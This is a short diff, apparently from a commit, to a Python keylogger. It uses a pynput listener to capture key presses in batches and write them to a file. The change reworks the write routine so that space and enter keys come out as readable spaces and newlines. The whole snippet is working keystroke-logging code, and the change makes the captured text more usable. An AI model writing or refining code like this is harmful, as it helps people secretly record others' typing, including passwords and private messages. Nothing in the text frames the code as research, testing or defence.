@@ -15,7 +15,7 @@ def on_press(key):
 
     if count >= 4:
         count = 0
-        write_file(str(keys))
+        write_file(keys)
         keys = []
 
 def on_release(key):
@@ -28,14 +28,12 @@ def write_file(keys):
         for key in keys:
             k = str(key).replace("'","")
 
-            output = ''.join(k)
-            output = output.replace('[', '').replace(']', '')
-
             if k.find("space") > 0:
+                f.write(' ')
+            if k.find("enter") > 0:
                 f.write('\n')
             elif k.find("Key") == -1:
-                f.write(output)
-
+                f.write(k)
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
